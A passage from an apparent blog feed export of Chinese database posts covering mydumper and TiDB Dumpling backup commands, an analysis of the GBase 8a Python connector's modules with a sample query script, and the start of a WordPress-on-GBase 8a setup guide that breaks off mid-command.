<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接信息</span></span><br><span class="line">host=192.168.195.128</span><br><span class="line">pass=password</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">全实例备份</span></span><br><span class="line">mydumper -u root -p $pass -h $host -o /data/backup/full_instance</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">全实例备份，压缩备份，并排除mysql,sys系统库</span></span><br><span class="line">mydumper -u root -p $pass -h $host -c --regex &#x27;^(?!(mysql\.|test\.|sys\.))&#x27; -o /data/backup/full_instance_compress</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份指定库</span></span><br><span class="line">mydumper -u root -p $pass -h $host -B sbtest -o /data/backup/db_sbtest</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份指定表</span></span><br><span class="line">mydumper -u root -p $pass -h $host -B sbtest -T t1,t2 -o /data/backup/db_sbtest_t1_t2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只备份表结构</span></span><br><span class="line">mydumper -u root -p $pass -h $host -B sbtest -d -o /data/backup/db_sbtest_ddl</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只备份表数据</span></span><br><span class="line">mydumper -u root -p $pass -h $host -B sbtest -m -o /data/backup/db_sbtest_data</span><br></pre></td></tr></table></figure></div>
<h3 id="备份文件命名">备份文件命名</h3>
<p>常见命名规则：</p>
<ol>
<li>metadata： 记录备份的开始、结束时间。</li>
<li>database-schema-create.sql: 建库语句。</li>
<li>database.table.sql: 该表的插入数据语句（若该表为空，则不存在此文件）。</li>
<li>database.table-metadata： 记录该表的行数。</li>
<li>database.table-schema.sql： 该表的创建语句。</li>
</ol>
<h2 id="mydumper-支持-TiDB">mydumper 支持 TiDB</h2>
<p>官方版本的 mydumper 对 TiDB 的支持。<br>
或者说，PingCAP 团队以将 mydumper 对 TiDB 的兼容性代码向上游提交 PR 并完成合并。</p>
<p><a class="link"   href="https://github.com/mydumper/mydumper/pull/155/" >https://github.com/mydumper/mydumper/pull/155/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>Add version detection for TiDB (detected_server).</li>
<li>Added support for tidb_snapshot option.</li>
<li>Auto-set tidb_snapshot to 1 second ago when TiDB detected.</li>
<li>Added optimization to dump _tidb_row id when it exists.</li>
</ul>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220224-27797560-5da0-48a1-bd22-90e1f79a9a96.png"
                      referrerpolicy="no-referrer"
                >
<p>另外，从网络图中我们可以看出，从16年10月开始，PingCAP创建了新的分支版本，并开始兼容性开发。</p>
<img  alt="3.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220224-a9183eb5-5324-45cd-b3ec-309f7a6306e3.jpg"
                      referrerpolicy="no-referrer"
                >
<p>从 pingcap/mydumper 的代码提交记录和PR来看，定制版 mydumper 虽然依旧支持 TiDB v5，但是由于从 TiDB v4 开始已经正式发布了 dumpling 工具，并被其取代。同时，我们也可以清晰的从官方文档里看到这样的一条<a class="link"   href="https://docs.pingcap.com/zh/tidb/v4.0/mydumper-overview#mydumper-%E7%AE%80%E4%BB%8B" >警告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
<blockquote>
<p>PingCAP 之前维护的 Mydumper 工具 fork 自 mydumper project，针对 TiDB 的特性进行了优化。Mydumper 目前已经不再开发新功能，其绝大部分功能已经被 Dumpling 取代。Dumpling 工具使用 Go 语言编写，支持更多针对 TiDB 特性的优化。强烈建议切换到 Dumpling。</p>
</blockquote>
<h2 id="Dumpling-简介">Dumpling 简介</h2>
<p>Dumpling 一个支持热、温备的逻辑备份工具，是 mydumper 的全新升级版，基本用法类似于 mydumper，但也有所区别，可使用tiup进行管理。<br>
Dumpling 从19年12月开始着手开发，使用Go语言编写，整合了 mydumper 的原有功能，并做了一些改进。</p>
<h3 id="代码-2">代码</h3>
<ul>
<li>原始代码库：<a class="link"   href="https://github.com/pingcap/dumpling" >https://github.com/pingcap/dumpling <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>最新代码库：<a class="link"   href="https://github.com/pingcap/tidb/tree/master/dumpling" >https://github.com/pingcap/tidb/tree/master/dumpling <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>注：<br>
Dumpling merged into TiDB (<a class="link"   href="https://github.com/pingcap/dumpling/pull/379" >#379 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<h3 id="Dumpling-的改进">Dumpling 的改进</h3>
<p>相比 Mydumper，Dumpling 做了如下改进：</p>
<ol>
<li>
<p>支持导出多种数据形式，包括 SQL/CSV。<br>
通过选项 <code>--filetype string</code> 进行控制，可以选择sql或csv。<br>
关于CSV格式还有4个相关参数：<br>
<code>--csv-delimiter</code>, csv文件中的定界符 (default “&quot;”)。<br>
<code>--csv-null-value</code>, csv中的null值 (default “\N”)。<br>
<code>--csv-separator</code>, csv文件中的分隔符 (default “,”)。</p>
</li>
<li>
<p>支持全新的 <code>table-filter</code>，筛选数据更加方便。<br>
整合了列表方式和正则方式，通过选项 <code>-f, --filter strings</code> 进行控制，默认值为：<code>[*.*,!/^(mysql|sys|INFORMATION_SCHEMA|PERFORMANCE_SCHEMA|METRICS_SCHEMA|INSPECTION_SCHEMA)$/.*]</code><br>
语法可参考: <a class="link"   href="https://github.com/pingcap/tidb-tools/blob/master/pkg/table-filter/README.md" >README <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li>
<p>支持导出到 Amazon S3 云盘。<br>
增加了一系列 S3 相关选项，具体有：</p>
</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--s3.aclstring</span><br><span class="line">--s3.endpointstring</span><br><span class="line">--s3.providerstring</span><br><span class="line">--s3.regionstring</span><br><span class="line">--s3.ssestring</span><br><span class="line">--s3.sse-kms-key-idstring</span><br><span class="line">--s3.storage-classstring</span><br></pre></td></tr></table></figure></div>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220224-f3585a2c-5b0b-4446-b237-0001b6dce27b.png"
                      referrerpolicy="no-referrer"
                >
<p>注：<a class="link"   href="https://docs.pingcap.com/tidb/stable/dumpling-overview#export-data-to-amazon-s3-cloud-storage" >Export data to Amazon S3 cloud storage <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ol start="4">
<li>针对 TiDB 进行了更多优化：
<ol>
<li>
<p>支持配置 TiDB 单条 SQL 内存限制。<br>
通过选项 <code>--tidb-mem-quota-query uint</code> 进行控制，单位为 bytes。</p>
</li>
<li>
<p>针对 TiDB v4.0.0 及更新版本支持自动调整 TiDB GC 时间。<br>
TiDB GC 相关概念可参考官方文档：</p>
</li>
<li>
<p>使用 TiDB 的隐藏列 <code>_tidb_rowid</code> 优化了单表内数据的并发导出性能。</p>
</li>
<li>
<p>对于 TiDB 可以设置 tidb_snapshot 的值指定备份数据的时间点，从而保证备份的一致性，而不是通过 <code>FLUSH TABLES WITH READ LOCK</code> 来保证备份一致性。<br>
相关参数：<code>--snapshot string</code>，需要配合参数 <code>--consistency=snapshot</code>一起使用。<br>
参数<code>--consistency</code>用于设定导出数据一致性级别，可设定为：<br>
1, auto: 默认值，MySQL flush, TiDB snapshot<br>
2, none: 不加锁 dump，无法保证一致性<br>
3, flush: dump 前用 FTWRL<br>
4, lock: 对需要 dump 的所有表执行 lock tables read<br>
5, snapshot: 通过 tso 指定 dump 位置</p>
</li>
</ol>
</li>
</ol>
<h3 id="Dumpling-所需权限">Dumpling 所需权限</h3>
<p>Dumpling 最小权限要求：<code>select, reload, lock tables, replication client</code><br>
创建用户示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> dumpling;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span> <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> dumpling;</span><br><span class="line"><span class="keyword">grant</span> reload, lock tables, replication client <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> dumpling;</span><br></pre></td></tr></table></figure></div>
<h3 id="常用备份命令-2">常用备份命令</h3>
<ul>
<li>DSN信息</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsn=&#x27;-u root -P 4000 --host 10.180.0.36&#x27;</span><br><span class="line">alias bk_time=&#x27;date +%Y-%m-%dT%H:%M:%S%z&#x27;</span><br><span class="line">bk_dir=/data/tibackup/export</span><br></pre></td></tr></table></figure></div>
<ul>
<li>采用默认值直接执行备份</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiup dumpling</span><br></pre></td></tr></table></figure></div>
<ul>
<li>备份全库，备份文件格式为csv(<code>--filetype</code>)，以8个线程执行备份(<code>-t</code>)，指定备份目录(<code>-o</code>)，并将日志输出到指定文件(<code>-L</code>)</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiup dumpling $dsn --filetype csv -t 8 -o $&#123;bk_dir&#125;-`bk_time` -L $&#123;bk_dir&#125;-`bk_time`.log</span><br></pre></td></tr></table></figure></div>
<ul>
<li>备份指定表(<code>--database</code>, <code>-T</code>)，输出文件按2000行进行分块，并发执行数据导出到不同文件，以提升效率(-r)；输出的文件按256MB进行拆分(<code>-F</code>)</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiup dumpling $dsn --database sbtest -T sbtest.t1 -r 2000 -F 256MB</span><br></pre></td></tr></table></figure></div>
<ul>
<li>备份指定表数据， <code>snapshot</code> 的时间点为 “2022-02-24 21:19:00”</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiup dumpling $dsn -T sbtest.t1 --snapshot &quot;2022-02-24 21:12:34&quot;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>备份指定表数据， 并控制 TiDB 单条查询语句的内存限制为 1G (<code>--tidb-mem-quota-query</code>)。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiup dumpling $dsn -T sbtest.t1 --tidb-mem-quota-query 1073741824</span><br></pre></td></tr></table></figure></div>
<h3 id="其他">其他</h3>
<p>使用 dumpling 时， 可将 <code>tidb:performance.force-priority</code> 优先级设定为 <code>LOW_PRIORITY</code>， 以降低备份对于集群的性能影响。</p>
<h2 id="写在最后">写在最后</h2>
<p>如果您还在使用 TiDB v5.x 之前的版本，建议升级TiDB，mydumper 只需了解即可。<br>
如果您已经在使用最新版的TiDB，那么一定要熟悉 Dumpling 的常规使用。<br>
作为 Ti-DBA-er，我们应该对TiDB周边生态工具的过往、现在、未来都有所了解、熟悉，甚至参与其中。这样才能更好的维护线上TiDB，更有效的保障系统稳定性。</p>
<h2 id="相关资源">相关资源</h2>
<ul>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/dumpling-overview" >官方文档 - Dumpling <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/player/30008;id=30008;classroomId=30005;rcoId=90103;courseDetailId=30002;learnerAttemptId=1645691722878" >301 TiDB 系统管理基础 -&gt; L 18：数据导出工具 Dumpling <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/player/120012;id=120012;classroomId=9;rcoId=360004;courseDetailId=120005;learnerAttemptId=1645706748187" >302 TiDB 高级系统管理 -&gt; L 19：TiDB Server 关键性能参数与优化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/tidb/pingcap-cert-pcta/">TiDB 认证 | PCTA 认证需要掌握的知识点</a></li>
<li><a href="https://shawnyan.cn/2022/tidb/pingcap-cert-pctp/">TiDB 认证 | 新版 PingCAP PCTP 认证考试 – 备考指南</a></li>
</ul>
<hr>
<p>Yan<br>
2022-02-24</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/335245" >https://www.modb.pro/db/335245 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/6d3a8da2?shareId=4b720bab" >https://tidb.net/blog/6d3a8da2?shareId=4b720bab <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 5.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap</tag>
        <tag>mydumper</tag>
        <tag>dumpling</tag>
        <tag>asktug</tag>
      </tags>
  </entry>
  <entry>
    <title>源码阅读 | 浅析 GBase 8a Python 连接器的源码</title>
    <url>/2022/gbase/gbase-8a-python-connector/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>GBase 8a 是南大通用公司自主研发的，面向海量数据查询分析应用领域的一款高性能国产新型数据库，产品用于满足各个数据密集型行业日益增大的数据查询、数据统计、数据分析、数据挖掘和数据备份等数据存储、管理和处理需求，可用做数据仓库系统、BI系统和决策支持系统的承载数据库。<br>
数据库开发过程中绕不开的一个环节就是开发接口。目前，适配 GBase 8a 的开发接口有 ODBC、JDBC、<a class="link"   href="http://ADO.NET" >ADO.NET <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、C API、Python API等。<br>
本文以 GBase Python Connector v3.0.1 为例，着重讨论 GBase 8a 的 Python 接口。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-python-connector/2023-02-22-02.png"
                      alt="Word Art.png" loading="lazy"
                ></p>
<h2 id="GBase-8a-Python-API-简述">GBase 8a Python API 简述</h2>
<p>GBase Python 接口是 Python 语言连接并使用 GBase 数据库的接口驱动程序。GBase Python 接口基于 <a class="link"   href="https://www.python.org/dev/peps/pep-0249/" >Python Database API Specification <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 标准编写。<br>
接口兼容标准的同时并支持如下特性：</p>
<ol>
<li>支持 Python 2.x 和 Python 3.x</li>
<li>完全支持 GBase 8a MPP Cluster 的特性</li>
<li>完全支持 SQL 标准语法</li>
<li>支持二进制流插入、更新</li>
<li>支持批量插入优化</li>
<li>支持多 SQL 语句执行和获取多结果集</li>
<li>支持 TCP/IP 协议</li>
<li>支持 Python 的 datetime 和 GBase 时间类型的映射</li>
</ol>
<h2 id="环境说明">环境说明</h2>
<p>本文中的代码与示例均以此环境信息作为基准。</p>
<ol>
<li>GBase 8a Docker 版</li>
<li>Python 3.6.8</li>
<li>gbase-connector-python 3.0.1</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 data]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">32238848b375        shihd/gbase8a:1.0   &quot;sh start.sh&quot;       4 hours ago         Up 4 hours          0.0.0.0:5258-&gt;5258/tcp   gbase8a</span><br><span class="line">[root@centos7 data]# python3 --version</span><br><span class="line">Python 3.6.8</span><br></pre></td></tr></table></figure></div>
<h2 id="代码结构">代码结构</h2>
<p>GBase Python Connector 中包含9个主要模块。<br>
其中有四个核心模块，分别为：</p>
<ol>
<li>GBaseConnection</li>
<li>GBaseConstants</li>
<li>GBaseCursor</li>
<li>GBaseError</li>
</ol>
<p>其他5个基础模块，分别为：</p>
<ol>
<li>GBaseLogger</li>
<li>GBaseProtocol</li>
<li>GBaseSocket</li>
<li>GBaseUtils</li>
<li>GBaseErrorCode</li>
</ol>
<p>下面按模块进行具体说明。</p>
<h3 id="GBaseConnection">GBaseConnection</h3>
<p><code>GBaseConnection</code> 负责创建 GBase 数据库的连接，执行SQL语句，并获取返回行数。<br>
引用了 GBaseLogger, GBaseCursor, GBaseSocket, GBaseProtocol, GBaseConstants, GBaseError 模块。</p>
<p>从源码可以看出，使用该接口，有3个必填项：用户名、密码、库名。初始化时，默认连接超时时间为 <code>30s</code>，开启自动提交，字符集为 <code>utf8</code>。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">self._host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">self._user = <span class="string">&#x27;&#x27;</span></span><br><span class="line">self._password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">self._database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">self._port = <span class="number">5258</span></span><br><span class="line">...</span><br><span class="line">self._connection_timeout = <span class="number">30</span></span><br><span class="line">self._autocommit = <span class="literal">True</span></span><br><span class="line">self._charset_id = <span class="number">33</span>  <span class="comment"># utf8</span></span><br></pre></td></tr></table></figure></div>
<h3 id="GBaseConstants">GBaseConstants</h3>
<p><code>GBaseConstants</code> 为常量类，定义客户端标记、字符集等。引用了 GBaseError 模块。</p>
<p>客户端标记，主要是指在该类中，定义了一系列类方法，其中主要有：数据类型（如：DECIMAL、DATETIME）、保留字（如：NOT_NULL、SET）。<br>
字符集，在源码中详细地罗列了字符集、校验规则，共127对。<br>
此外，还定义了SQL Mode，共33种。</p>
<p>这里提及一下 <strong><code>GBaseSocket</code></strong> 模块，因为 <code>GBaseSocket</code> 模块涉及到两个定义在 <code>GBaseConstants</code> 中的常量：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MAX_PACKET_LENGTH = 16777215</span><br><span class="line">GBASE_PACKET_HEADER_LEN = 4</span><br></pre></td></tr></table></figure></div>
<h3 id="GBaseCursor">GBaseCursor</h3>
<p><code>GBaseCursor</code>，为执行GBase数据库操作的游标类，可以执行SQL语句、存储过程、获取结果集。<br>
引用了 GBaseLogger, GBaseError, GBaseUtils, GBaseConstants 模块。</p>
<p>该模块中定义的<code>execute</code>方法，可以启用<code>multi_stmt</code>开关，以此将多条语句同时发送。<br>
这个开关的具体代码示例可参见文章：<a class="link"   href="https://www.modb.pro/db/40982" >南大通用GBase 8a MPP Python接口技术（五） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="GBaseError">GBaseError</h3>
<p><code>GBaseError</code>，该模块为异常处理类，定义接口抛出的异常。引用了 GBaseLogger 模块。</p>
<p>具体来说，异常处理类分为：</p>
<ol>
<li>Warning：重要的告警异常</li>
<li>DatabaseError：数据库相关异常
<ol>
<li>InternalError：数据库内部异常</li>
<li>OperationalError：连接异常或访问受限</li>
<li>ProgrammingError：程序异常，指非法参数、语句、命名等</li>
</ol>
</li>
<li>InterfaceError：接口异常，其他模块会调用该接口来抛异常</li>
</ol>
<p>顺便说下 <strong><code>GBaseLogger</code></strong> 模块，该模块定义了四种类型的日志：“debug, error, sql, all”，这里的“sql”是指“SQL Mode”相关日志。</p>
<h3 id="GBaseUtils">GBaseUtils</h3>
<p>在该模块中，定义了若干方法来做Python和GBase之间的数据类型映射，例如上文提到的“支持Python的datetime和GBase时间类型的映射”，即是由 <code>_datetime_to_gbase / _DATETIME_to_python</code> 两个方法来实现的。</p>
<h2 id="模块关系图">模块关系图</h2>
<p>至此，几个模块的基础信息已分析完毕，下面以一张模块关系图来作为小结。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-python-connector/2023-02-22-03.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="实例演示">实例演示</h2>
<p>最后，以一段演示代码来作为本文的结尾。<br>
用Python代码通过 GBase Python 接口来连接 GBase 8a 数据库，并查询数据库中表数据大于0的表，按表数据行数逆序排序，展示表名、表引擎、表行数三个字段。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> GBaseConnector <span class="keyword">import</span> connect, GBaseError</span><br><span class="line"></span><br><span class="line">config = &#123;<span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;192.168.195.128&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;port&#x27;</span>: <span class="number">5258</span>,</span><br><span class="line">          <span class="string">&#x27;db&#x27;</span>: <span class="string">&#x27;gbase&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = connect()</span><br><span class="line">    conn.connect(**config)</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;SELECT TABLE_NAME, ENGINE,TABLE_ROWS FROM information_schema.TABLES &quot;</span></span><br><span class="line">                <span class="string">&quot;WHERE TABLE_ROWS &gt; 0 ORDER BY TABLE_ROWS DESC;&quot;</span>)</span><br><span class="line">    row = cur.fetchmany(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">while</span> row:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br><span class="line">        row = cur.fetchmany(<span class="number">4</span>)</span><br><span class="line">    rowcnt = cur.rowcount</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Total:&quot;</span>, rowcnt, <span class="string">&quot;rows in set&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> GBaseError <span class="keyword">as</span> err:</span><br><span class="line">    <span class="built_in">print</span>(err)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></div>
<p>直接从GBase查询的结果集：</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-python-connector/2023-02-22-04.jpg"
                      alt="" loading="lazy"
                ></p>
<p>执行python代码的结果集：</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-python-connector/2023-02-22-05.jpg"
                      alt="" loading="lazy"
                ></p>
<h2 id="相关链接">相关链接</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/246258" >活动 | 第一届“GBase技术文章”有奖征文大赛活动公告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/245537" >征文大赛 | 第一届“GBase技术文章”有奖征文常见问题解答 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/325922" >第一届“GBase技术征文大赛”首批入围文章发布啦🔈~（持续更新中） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2021/gbase-8a-gdca/">资深DBA带您了解GBase培训</a></li>
<li><a class="link"   href="https://mp.weixin.qq.com/s/Ije3hCvG4xtnZ3bH9WPI_w" >新春开课 | 欢迎参加GBase 8a MPP CLuster数据库2月训练营 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/gbase/gbase-8a-blog-case/">案例分析 | 搭建基于 GBase 8a 的博客系统过程中遇到的若干问题</a></li>
</ul>
<hr>
<p>2022-02-22<br>
Shawn Yan</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/334411" >https://www.modb.pro/db/334411 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8a</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>gbase 8a</tag>
        <tag>南大通用</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>案例分析 | 搭建基于 GBase8a 的博客系统遇到的若干问题</title>
    <url>/2022/gbase/gbase-8a-blog-case/</url>
    <content><![CDATA[<h2 id="关于-GBase-8a-数据库">关于 GBase 8a 数据库</h2>
<p><a class="link"   href="https://www.modb.pro/wiki/26" >GBase <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是南大通用数据技术有限公司推出的自主品牌的数据库产品，在国内数据库市场具有较高的品牌知名度。</p>
<p>GBase 8a MPP Cluster （以下简称“8a集群”）是南大通用公司自主研发、国内领先的大规模分布式并行数据库集群系统，具有满足各个数据密集型行业日益增大的数据分析、数据挖掘、数据备份和即席查询等需求的能力。已在人民银行、银监会、农总行、中行、中移动、海关总署等数百家用户形成规模化应用，目前部署节点总数超过25000个，管理数据超过200PB。</p>
<h2 id="关于-WordPress-博客系统">关于 WordPress 博客系统</h2>
<p><a class="link"   href="https://wordpress.com/zh-cn/" >WordPress <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是使用PHP语言开发的博客平台，并逐步演化成一款内容管理系统软件，它是使用PHP语言和MySQL数据库开发的，用户可以在支持 PHP 和 MySQL数据库的服务器上使用自己的博客。</p>
<h2 id="环境准备">环境准备</h2>
<ol>
<li>OS: CentOS Linux release 7.9.2009 (Core)</li>
<li>OS安全：关闭防火墙、iptables、selinux等。</li>
<li>安装并启动Docker服务</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 wp-blog]# systemctl status docker</span><br><span class="line">● docker.service - Docker Application Container Engine</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Sun 2022-02-20 20:12:56 CST; 1h 51min ago</span><br></pre></td></tr></table></figure></div>
<h2 id="启动-GBase-8a-数据库">启动 GBase 8a 数据库</h2>
<p>本案例中，为便于演示，使用 Docker 版的 GBase 8a，具体启动命令如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从 Docker Hub 拉去镜像</span></span><br><span class="line">docker pull shihd/gbase8a:1.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行容器，将端口5258映射到宿主机</span></span><br><span class="line">docker run -dit --name gbase8a -p5258:5258 -v /data/dg/:/data shihd/gbase8a:1.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入容器内</span></span><br><span class="line">docker exec -it gbase8a bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入gbase数据库</span></span><br><span class="line">gbase -uroot -proot</span><br></pre></td></tr></table></figure></div>
<p>为 wordpress 准备 user/schema：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database wordpress;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> wp@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;wp&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> wordpress.<span class="operator">*</span> <span class="keyword">to</span> wp@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> wp@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-blog-case/2023-02-20-02.jpg"
                      alt="" loading="lazy"
                ></p>
<h2 id="安装-WordPress">安装 WordPress</h2>
<p>使用 Yum 直接安装 wordpress, apache server，命令如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装 wordpress 包</span></span><br><span class="line">yum -y install wordpress httpd</span><br><span class="line"><span class="comment"># 打印php信息，稍后可通过页面进行查看</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> &gt; /var/www/html/phpinfo.php</span><br><span class="line"><span class="comment"># 在 apache server 的路径下，创建 wordpress 目录的链接</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/share/wordpress /var/www/html/wp-blog</span><br></pre></td></tr></table></figure></div>
<p>到此，基本安装完成，接下来需要配置数据库连接信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改数据库连接信息</span></span><br><span class="line">sed -i <span class="string">&#x27;s/database_name_here/wordpress/&#x27;</span> /var/www/html/wp-blog/wp-config.php</span><br><span class="line">sed -i <span class="string">&#x27;s/username_here/wp/&#x27;</span> /var/www/html/wp-blog/wp-config.php</span><br><span class="line">sed -i <span class="string">&#x27;s/password_here/wp/&#x27;</span> /var/www/html/wp-blog/wp-config.php</span><br><span class="line">sed -i <span class="string">&#x27;s/localhost/192.168.8.101:5258/&#x27;</span> /var/www/html/wp-blog/wp-config.php</span><br><span class="line"><span class="comment">## 修改默认字符校验规则</span></span><br><span class="line">sed -i <span class="string">&#x27;s/utf8mb4_unicode_520_ci/utf8mb4_unicode_ci/&#x27;</span> /var/www/html/wp-blog/wp-includes/wp-db.php</span><br><span 